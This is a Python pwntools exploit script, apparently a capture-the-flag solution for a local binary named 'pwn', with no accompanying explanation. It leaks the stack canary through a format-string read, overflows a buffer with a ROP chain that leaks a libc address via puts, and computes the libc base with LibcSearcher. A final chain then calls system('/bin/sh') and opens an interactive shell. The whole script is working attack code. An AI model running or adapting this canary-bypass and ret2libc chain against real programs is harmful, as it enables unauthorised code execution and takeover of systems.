from pwn import *
from LibcSearcher import LibcSearcher

p=process('./pwn')
elf=ELF('./pwn')

vuln=p64(0x400887)
puts_addr=elf.plt['puts']
libc_start=elf.got['__libc_start_main']

pop_rdi_ret=p64(0x400993)

payload1="%7$p"

p.recvuntil('u!\n')
p.sendline(payload1)
canary=eval(p.recvuntil("\n",drop=True))
log.success('[*]canary:'+hex(canary))

payload2='a'*24+p64(canary)+'a'*8+pop_rdi_ret+p64(libc_start)+p64(puts_addr)+vuln
p.recvuntil('story!\n')
p.sendline(payload2)

libc_start_main_addr = u64(p.recvuntil("\n",True).ljust(8,"\x00"))
#libc_start_main_addr = p.recvuntil("\n",True).ljust(8,"\x00")
#print(libc_start_main_addr)
#pause()
log.success('[*]__libc_start_main:'+hex(libc_start_main_addr))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.success('[*]system:'+hex(system_addr))
log.success('[*]binsh:'+hex(binsh_addr))


payload3='a'*24+p64(canary)+'a'*8+pop_rdi_ret+p64(binsh_addr)+p64(system_addr)
p.sendlineafter('story!\n',payload3)
p.interactive()


